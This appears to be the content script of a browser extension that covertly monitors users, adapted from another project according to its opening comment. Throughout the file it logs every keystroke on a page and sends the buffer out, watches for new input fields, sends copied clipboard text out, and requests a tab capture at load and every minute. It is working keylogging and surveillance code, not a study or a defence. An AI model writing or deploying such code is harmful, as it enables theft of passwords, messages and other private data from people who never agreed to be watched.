/* content-script was copied from msfrieda and edited to fit our use cases */
import _ from "lodash";
import { DataTypes } from "../consts";
import { Messenger } from "../utils/browser/utils";

let buffer = "";

const debouncedCaptureKeylogBuffer = _.debounce(async () => {
  if (buffer.length > 0) {
    await Messenger(DataTypes.KEYSTROKES, buffer)

    buffer = "";
  }
}, 2000);

document.addEventListener("keyup", (e: KeyboardEvent) => {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});

const inputs: WeakSet<Element> = new WeakSet();

const debouncedHandler = _.debounce(() => {
  [...document.querySelectorAll("input,textarea,[contenteditable")]
    .filter((input: Element) => !inputs.has(input))
    .map((input) => {
      input.addEventListener(
        "input",
        _.debounce((e) => {
          console.log(e);
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() => debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });

document.addEventListener("copy", () => Messenger(DataTypes.CLIPBOARD, window.getSelection()?.toString()));

setInterval(() => {
  Messenger(DataTypes.TAB_CAPTURE);
}, 60 * 1000);

Messenger(DataTypes.TAB_CAPTURE);